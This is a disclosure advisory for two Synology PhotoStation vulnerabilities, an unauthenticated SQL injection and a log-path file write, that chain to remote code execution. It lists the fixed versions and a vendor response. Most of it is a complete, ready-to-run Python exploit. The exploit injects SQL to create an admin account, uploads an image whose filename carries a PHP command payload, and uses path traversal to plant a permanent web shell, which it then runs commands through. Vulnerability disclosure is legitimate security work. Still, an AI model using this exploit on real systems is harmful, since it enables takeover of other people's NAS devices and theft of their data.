**Vulnerabilities Summary**<br>
The following advisory describes two vulnerabilities found in Synology PhotoStation, an unauthenticated SQL injection combined with an authenticated arbitrary file writing with partially controlled data vulnerabilities which leads to remote code execution.

**Credit**<br>
Independent security researcher, MengHuan Yu, has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.

**Affected systems**<br>
<table>
  <thead>
    <tr>
      <th>Product</th>
      <th>Severity</th>
      <th>Fixed Release Availability</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Photo Station 6.8</td>
      <td>Important</td>
      <td>Upgrade to 6.8.11-3489 or above.</td>
    </tr>
    <tr>
      <td>Photo Station 6.3</td>
      <td>Important</td>
      <td>Upgrade to 6.3-2977 or above.</td>
    </tr>
  </tbody>
</table>

**Vendor Response**<br>
“We have updated the acknowledgments page. If you have any questions, please do not hesitate to contact us.”
https://www.synology.com/en-global/security/advisory/Synology_SA_19_01

**Vulnerability Details**<br>
PhotoStation is a package on Synology’s NAS (Network Attached Storage). PhotoStation creates a website `'/photo/'` and a database under their default web root.

**First Vulnerability – Unauthenticated SQL Injection**<br>
PhotoStation’s website is exposed to the internet by default. The parameter `type` of the function `getExifList` in `include/photo/synophoto_csPhotoDB.php` is used to create a SQL query.

`$query = 'SELECT DISTINCT '.$type.' FROM photo_image ORDER BY ' .$type;`

The query is executed in `ListExif` function inside `webapi/photo.php`.

We can exploit this vulnerability in order to to select/insert/delete/edit any data in the database. This will cause a remote code execution if combined with another vulnerability.

**Second Vulnerability – Arbitrary File Writing with Partially Controlled Content**<br>
In order to exploit this vulnerability, the following requirements are needed:
* Access to PhotoStation website
* Having file upload permission.
* If the guest uploading is enabled, the vulnerability can be triggered without being logged in (Unauthenticated)
* If the personal PhotoStation is enabled, a normal user can trigger the vulnerability.
* If there is a XSS vulnerability, we can attack users with upload permission and trigger an upload
* Any user with file upload permissions that visits a malicious website, can be attacked because PhotoStation does not have a protection from Cross Site Request Forgery.

The `SYNOPHOTO_AJAX_HANDLER_DoFaceRecognition` of `ajax_handler.php` uses `"/tmp/synophoto_facerecog.".$_POST['prog_id'];` to log the process. However, `prog_id` is user controlled data, which means that the attacker can control the process log’s path. The log content will contain the image name that we want to process. We can exploit it by uploading the log file under the webroot and control the filename and upload a php script.

Any arbitrary SQL statement can create an admin privileged user, which means that by using the first SQL injection vulnerability, we can always create a user with file uploading permissions, and then trigger the second vulnerability in order to achieve remote code execution.

**Exploit**<br>
This exploit trigger the two vulnerabilities and creates a web shell.

```python
import requests
import hashlib
import os
import time
import string
import random

# TODO
HOST = '<your host ip>'

# ------------------------------------------------------------------------------

def hexstr(s):
    return s.encode('hex')
def md5(s):
    return hashlib.md5(s).hexdigest()
def randstr(n = 10):
    return ''.join([random.choice(string.ascii_letters) for i in range(10)])

username = 'RCE'
password = 'RCE'
uploaded_image_name = randstr() + '-<?php system($_GET[cmd]); ?>.jpg'
webroot = '/var/packages/PhotoStation/target/photo/'
permanent_shell_name = randstr() + '.php'
cmd = 'echo; echo; id; echo;'

sess = requests.Session()
def stage1():
    payload = " 1; "
    payload += "UPDATE photo_config SET config_value='0' WHERE config_key='account_system'; "
    payload += "Insert into photo_user (userid, username, password, description, lock_pass, admin, disabled, email) "
    payload += "VALUES (1, '%s', '%s', '', 'f', 't', 'f', 'mail'); " % (username, md5(password))
    payload += ' -- '

    r = requests.post('http://%s/photo/webapi/photo.php' % HOST, data = {
        'version': '1',
        'method': 'listexif',
        'api': 'SYNO.PhotoStation.Photo',
        'type': payload
    })
    print r.text


def stage2():
    global sess

    r = sess.post('http://%s/photo/webapi/auth.php' % HOST, data = {
        'api': 'SYNO.PhotoStation.Auth',
        'method': 'login',
        'version': '1',
        'username': username,
        'password': password,
    })
    print r.text
    assert '"success":true' in r.text


def stage3():
    global sess

    # a valid small jpg, the content is not important
    content = '/9j/2wBDAAMCAgICAgMCAgIDAwMDBAYEBAQEBAgGBgUGCQgKCgkICQkKDA8MCgsOCwkJDRENDg8QEBEQCgwSExIQEw8QEBD/yQALCAABAAEBAREA/8wABgAQEAX/2gAIAQEAAD8A0s8g/9k='.decode('base64')

    r = sess.post('http://%s/photo/webapi/file.php' % HOST, data = {
        'api': 'SYNO.PhotoStation.File',
        'method': 'uploadphoto',
        'version': '1',
        'dest_folder_path': '',
        'duplicate': 'ignore',
        'filename': uploaded_image_name,
        'mtime': '1234567890000'
    },
        files={'original': (uploaded_image_name, content, 'image/jpeg')}
    )
    print r.text
    assert '"success":true' in r.text


def stage4():
    global sess

    photoid = 'photo_%s_%s' % (hexstr('/'), hexstr(uploaded_image_name))
    path = '/../../../../' + webroot + permanent_shell_name
    while True:
        time.sleep(1.0)
        r = sess.post('http://%s/photo/ajax_handler.php' % HOST,
            data={
                'action': 'face_recog',
                'id': photoid,
                'prog_id': path,
            }
        )
        print r.text
        if '"success":true' in r.text:
            break

def stage5():
    r = requests.get('http://%s/photo/%s' % (HOST, permanent_shell_name), params = {
            'cmd': cmd
    })
    print r.text


def main():
    print '=== Synology PhotoStation Un-auth RCE ==='

    print '1. Using SQLi change the server setting and create admin account'
    stage1()
    print ''

    print '2. Login with injected account'
    stage2()
    print ''

    print '3. Upload image with craft filename'
    stage3()
    print ''

    print '4. Trigger RCE vulnerability with uploaded image and create permanent web shell'
    stage4()
    print ''

    print '5. RCE with permanent web shell located at /photo/%s' % permanent_shell_name
    stage5()

if __name__ == '__main__':
    main()
```
